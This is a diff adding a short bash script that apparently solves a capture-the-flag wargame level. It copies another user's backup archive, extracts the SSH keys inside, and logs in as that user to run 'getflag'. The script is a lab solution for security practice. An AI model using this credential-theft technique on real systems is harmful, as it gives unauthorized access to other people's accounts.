@@ -1,0 +1,11 @@
+#!/bin/bash
+
+# Copy the backup to the home directory.
+cp /home/flag05/.backup/backup-19072011.tgz /home/level05/
+
+# Decompress the SSH keys from the backup.
+tar -xvf /home/level05/backup-19072011.tgz
+
+# Log in as user "flag05" using the SSH keys.
+ssh flag05@localhost getflag
+
